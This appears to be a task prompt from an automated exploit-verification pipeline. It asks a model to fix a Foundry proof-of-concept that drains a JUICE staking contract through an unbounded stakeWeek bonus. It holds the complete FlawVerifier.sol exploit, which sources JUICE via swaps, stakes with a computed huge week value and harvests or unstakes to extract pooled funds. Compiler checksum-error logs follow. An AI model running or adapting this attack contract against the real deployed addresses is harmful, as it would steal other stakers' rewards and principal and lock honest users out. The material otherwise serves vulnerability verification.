You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unbounded `stakeWeek` lets a staker mint an arbitrarily large bonus and drain the pool
- claim: `stake()` accepts any positive `stakeWeek`, and both `harvest()` and `unstake()` pay a bonus of `pending * (stakingWeek - 1) * 9 / 100`. Because there is no upper bound or normalization on `stakingWeek`, an attacker can choose an extreme value and turn even a small amount of accrued base reward into an arbitrarily large claim on the contract's shared token balance.
- impact: A permissionless staker can drain not only funded rewards but also other users' deposited principal held by the contract. Once enough balance is extracted, later harvests and unstakes revert, causing theft and permanent lockup for honest users.
- exploit_paths: ["Attacker calls `stake(tinyAmount, hugeStakeWeek)` while staking is open.", "After any nonzero base reward accrues, the attacker calls `harvest(stakeCount)` or waits to call `unstake(stakeCount)`.", "The computed `bonus` becomes enormous and is transferred from the contract's pooled JUICE balance, depleting rewards and potentially user principal."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IJuiceStaking {
    function Juice() external view returns (address);
    function JuiceStaked() external view returns (uint256);
    function rewardPerSecond() external view returns (uint256);
    function stake(uint256 amount, uint256 stakeWeek) external;
    function harvest(uint256 stakeCount) external;
    function unstake(uint256 stakeCount) external;
    function pendingReward(address staker, uint256 stakeCount) external view returns (uint256 pending, uint256 bonus);
    function stakingStartTime() external view returns (uint256);
    function stakingEndTime() external view returns (uint256);
    function stakingCount(address staker) external view returns (uint256);
    function mapStakingInfo(address staker, uint256 stakeCount)
        external
        view
        returns (
            uint256 stakedAmount,
            uint256 startTime,
            uint256 endTime,
            uint256 stakingWeek,
            uint256 rewardDebt,
            uint256 unstakeStatus
        );
}

interface IWETH9 is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV3RouterLike {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract FlawVerifier {
    IJuiceStaking internal constant STAKING = IJuiceStaking(0x8584ddbd1e28bca4bc6fb96bafe39f850301940e);

    address internal constant JUICE = 0xde5d2530a877871f6f0fc240b9fce117246dadae;
    address internal constant WETH = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2;
    address internal constant USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48;
    address internal constant USDT = 0xdac17f958d2ee523a2206206994597c13d831ec7;
    address internal constant DAI = 0x6b175474e89094c44da98b954eedeac495271d0f;

    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f;
    address internal constant UNISWAP_V3_ROUTER = 0xe592427a0aece92de3edee1f18e0157c05861564;

    uint256 internal constant TARGET_PENDING_HORIZON = 1 days;
    uint256 internal constant PAYOUT_SAFETY_DIVISOR = 100;
    uint256 internal constant MAX_REASONABLE_HUGE_STAKE_WEEK = 1e30;

    uint256 internal baselineBalance;
    uint256 internal trackedStakeCount;
    uint256 internal trackedStakeEndTime;
    bool internal baselineSet;
    bool internal stakeOpened;

    constructor() payable {}

    receive() external payable {}

    function executeOnOpportunity() public payable {
        if (!stakeOpened) {
            _tryOpenExploitPosition();
            return;
        }

        _tryRealizeExploitProfit();
    }

    function profitToken() external pure returns (address) {
        return JUICE;
    }

    function profitAmount() external view returns (uint256) {
        if (!baselineSet) {
            return 0;
        }

        uint256 currentBalance = IERC20Minimal(JUICE).balanceOf(address(this));
        if (currentBalance <= baselineBalance) {
            return 0;
        }

        return currentBalance - baselineBalance;
    }

    function _tryOpenExploitPosition() internal {
        uint256 stakingStart = STAKING.stakingStartTime();
        if (stakingStart == 0) {
            return;
        }

        uint256 stakingEnd = STAKING.stakingEndTime();
        if (stakingEnd <= block.timestamp) {
            return;
        }

        uint256 rewardRate = STAKING.rewardPerSecond();
        if (rewardRate == 0) {
            return;
        }

        uint256 verifierHeldJuice = _ensureSeedJuice();
        if (verifierHeldJuice == 0) {
            return;
        }

        uint256 currentTotalStaked = STAKING.JuiceStaked();
        uint256 tinyAmount = _chooseTinyAmount(verifierHeldJuice, currentTotalStaked, rewardRate);
        if (tinyAmount == 0) {
            return;
        }

        uint256 hugeStakeWeek =
            _chooseHugeStakeWeek(tinyAmount, currentTotalStaked, rewardRate, IERC20Minimal(JUICE).balanceOf(address(STAKING)));

        trackedStakeCount = STAKING.stakingCount(address(this));

        if (!_forceApprove(JUICE, address(STAKING), tinyAmount)) {
            return;
        }

        uint256 preStakeJuiceBalance = verifierHeldJuice;

        // Core exploit path step 1:
        // acquire a tiny real JUICE position, then call stake(tinyAmount, hugeStakeWeek)
        // while staking is open. Any swap used above is only seed funding for the tiny stake;
        // the vulnerability remains the unbounded stakingWeek value stored by the target.
        try STAKING.stake(tinyAmount, hugeStakeWeek) {
            baselineBalance = preStakeJuiceBalance;
            baselineSet = true;
            (, , trackedStakeEndTime, , , ) = STAKING.mapStakingInfo(address(this), trackedStakeCount);
            stakeOpened = true;
        } catch {}
    }

    function _tryRealizeExploitProfit() internal {
        (
            uint256 stakedAmount,
            ,
            uint256 endTime,
            ,
            ,
            uint256 unstakeStatus
        ) = STAKING.mapStakingInfo(address(this), trackedStakeCount);

        if (stakedAmount == 0 || unstakeStatus != 0) {
            return;
        }

        (uint256 pending, ) = STAKING.pendingReward(address(this), trackedStakeCount);
        if (pending == 0) {
            return;
        }

        // Core exploit path steps 2 and 3:
        // after nonzero base reward accrues, harvest(stakeCount) or unstake(stakeCount)
        // realizes the oversized bonus computed from the attacker-chosen huge stakingWeek.
        if (block.timestamp >= endTime || block.timestamp >= trackedStakeEndTime) {
            try STAKING.unstake(trackedStakeCount) {} catch {}
        } else {
            try STAKING.harvest(trackedStakeCount) {} catch {}
        }
    }

    function _ensureSeedJuice() internal returns (uint256 verifierHeldJuice) {
        verifierHeldJuice = IERC20Minimal(JUICE).balanceOf(address(this));
        if (verifierHeldJuice != 0) {
            return verifierHeldJuice;
        }

        _wrapNativeIfPresent();

        // Attempt strategy is direct_or_existing_balance_first.
        // These swaps only use assets already held by the verifier and only exist to source the
        // tiny JUICE amount needed for the vulnerable stake call when the verifier starts with 0 JUICE.
        _tryAcquireJuiceFromHeldAsset(WETH);
        verifierHeldJuice = IERC20Minimal(JUICE).balanceOf(address(this));
        if (verifierHeldJuice != 0) {
            return verifierHeldJuice;
        }

        _tryAcquireJuiceFromHeldAsset(USDC);
        verifierHeldJuice = IERC20Minimal(JUICE).balanceOf(address(this));
        if (verifierHeldJuice != 0) {
            return verifierHeldJuice;
        }

        _tryAcquireJuiceFromHeldAsset(USDT);
        verifierHeldJuice = IERC20Minimal(JUICE).balanceOf(address(this));
        if (verifierHeldJuice != 0) {
            return verifierHeldJuice;
        }

        _tryAcquireJuiceFromHeldAsset(DAI);
        verifierHeldJuice = IERC20Minimal(JUICE).balanceOf(address(this));
    }

    function _wrapNativeIfPresent() internal {
        uint256 nativeBalance = address(this).balance;
        if (nativeBalance == 0) {
            return;
        }

        try IWETH9(WETH).deposit{value: nativeBalance}() {} catch {}
    }

    function _tryAcquireJuiceFromHeldAsset(address tokenIn) internal {
        uint256 balance = IERC20Minimal(tokenIn).balanceOf(address(this));
        if (balance == 0) {
            return;
        }

        if (_tryV2Swap(tokenIn, JUICE, balance, UNISWAP_V2_ROUTER)) {
            return;
        }
        if (_tryV2Swap(tokenIn, JUICE, balance, SUSHISWAP_ROUTER)) {
            return;
        }

        if (tokenIn != WETH) {
            if (_tryV2SwapViaWeth(tokenIn, balance, UNISWAP_V2_ROUTER)) {
                return;
            }
            if (_tryV2SwapViaWeth(tokenIn, balance, SUSHISWAP_ROUTER)) {
                return;
            }
        }

        _tryV3Swap(tokenIn, balance, 500);
        if (IERC20Minimal(JUICE).balanceOf(address(this)) != 0) {
            return;
        }

        _tryV3Swap(tokenIn, balance, 3_000);
        if (IERC20Minimal(JUICE).balanceOf(address(this)) != 0) {
            return;
        }

        _tryV3Swap(tokenIn, balance, 10_000);
    }

    function _tryV2Swap(address tokenIn, address tokenOut, uint256 amountIn, address router) internal returns (bool) {
        if (!_forceApprove(tokenIn, router, amountIn)) {
            return false;
        }

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        try IUniswapV2RouterLike(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp
        ) {
            return IERC20Minimal(tokenOut).balanceOf(address(this)) != 0;
        } catch {
            return false;
        }
    }

    function _tryV2SwapViaWeth(address tokenIn, uint256 amountIn, address router) internal returns (bool) {
        if (!_forceApprove(tokenIn, router, amountIn)) {
            return false;
        }

        address[] memory path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = JUICE;

        try IUniswapV2RouterLike(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp
        ) {
            return IERC20Minimal(JUICE).balanceOf(address(this)) != 0;
        } catch {
            return false;
        }
    }

    function _tryV3Swap(address tokenIn, uint256 amountIn, uint24 fee) internal returns (bool) {
        if (!_forceApprove(tokenIn, UNISWAP_V3_ROUTER, amountIn)) {
            return false;
        }

        IUniswapV3RouterLike.ExactInputSingleParams memory params = IUniswapV3RouterLike.ExactInputSingleParams({
            tokenIn: tokenIn,
            tokenOut: JUICE,
            fee: fee,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amountIn,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        try IUniswapV3RouterLike(UNISWAP_V3_ROUTER).exactInputSingle(params) returns (uint256 amountOut) {
            return amountOut != 0;
        } catch {
            return false;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        uint256 currentAllowance = IERC20Minimal(token).allowance(address(this), spender);
        if (currentAllowance >= amount) {
            return true;
        }

        if (_callOptionalReturn(token, abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount))) {
            return true;
        }

        if (!_callOptionalReturn(token, abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, 0))) {
            return false;
        }

        return _callOptionalReturn(token, abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
        (bool success, bytes memory returndata) = token.call(data);
        return success && (returndata.length == 0 || abi.decode(returndata, (bool)));
    }

    function _chooseTinyAmount(
        uint256 verifierHeldJuice,
        uint256 currentTotalStaked,
        uint256 rewardRate
    ) internal pure returns (uint256 tinyAmount) {
        if (currentTotalStaked == 0) {
            return verifierHeldJuice >= 1 ? 1 : verifierHeldJuice;
        }

        uint256 divisor = rewardRate * TARGET_PENDING_HORIZON;
        if (divisor == 0) {
            return verifierHeldJuice;
        }

        tinyAmount = currentTotalStaked / divisor;
        if (currentTotalStaked % divisor != 0) {
            tinyAmount += 1;
        }

        if (tinyAmount == 0) {
            tinyAmount = 1;
        }

        if (tinyAmount > verifierHeldJuice) {
            tinyAmount = verifierHeldJuice;
        }
    }

    function _chooseHugeStakeWeek(
        uint256 tinyAmount,
        uint256 currentTotalStaked,
        uint256 rewardRate,
        uint256 poolBalance
    ) internal pure returns (uint256 hugeStakeWeek) {
        uint256 expectedPending = rewardRate * TARGET_PENDING_HORIZON;
        expectedPending = (expectedPending * tinyAmount) / (currentTotalStaked + tinyAmount);
        if (expectedPending == 0) {
            expectedPending = 1;
        }

        uint256 desiredPayout = poolBalance / PAYOUT_SAFETY_DIVISOR;
        if (desiredPayout <= expectedPending) {
            return 2;
        }

        uint256 bonusTarget = desiredPayout - expectedPending;
        hugeStakeWeek = ((bonusTarget * 100) / (expectedPending * 9)) + 1;

        if (hugeStakeWeek < 2) {
            hugeStakeWeek = 2;
        }

        if (hugeStakeWeek > MAX_REASONABLE_HUGE_STAKE_WEEK) {
            hugeStakeWeek = MAX_REASONABLE_HUGE_STAKE_WEEK;
        }
    }
}

```

forge stdout (tail):
```
dress-literals
  --> src/FlawVerifier.sol:69:39:
   |
69 |     address internal constant JUICE = 0xde5d2530a877871f6f0fc240b9fce117246dadae;
   |                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:70:38:
   |
70 |     address internal constant WETH = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2;
   |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:71:38:
   |
71 |     address internal constant USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48;
   |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xdAC17F958D2ee523a2206206994597C13D831ec7". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xdAC17F958D2ee523a2206206994597C13D831ec7". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:72:38:
   |
72 |     address internal constant USDT = 0xdac17f958d2ee523a2206206994597c13d831ec7;
   |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x6B175474E89094C44Da98b954EedeAC495271d0F". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x6B175474E89094C44Da98b954EedeAC495271d0F". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:73:37:
   |
73 |     address internal constant DAI = 0x6b175474e89094c44da98b954eedeac495271d0f;
   |                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:75:51:
   |
75 |     address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;
   |                                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:76:50:
   |
76 |     address internal constant SUSHISWAP_ROUTER = 0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f;
   |                                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0xE592427A0AEce92De3Edee1F18E0157C05861564". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0xE592427A0AEce92De3Edee1F18E0157C05861564". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:77:51:
   |
77 |     address internal constant UNISWAP_V3_ROUTER = 0xe592427a0aece92de3edee1f18e0157c05861564;
   |                                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


```

forge stderr (tail):
```
Error: Compilation failed

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
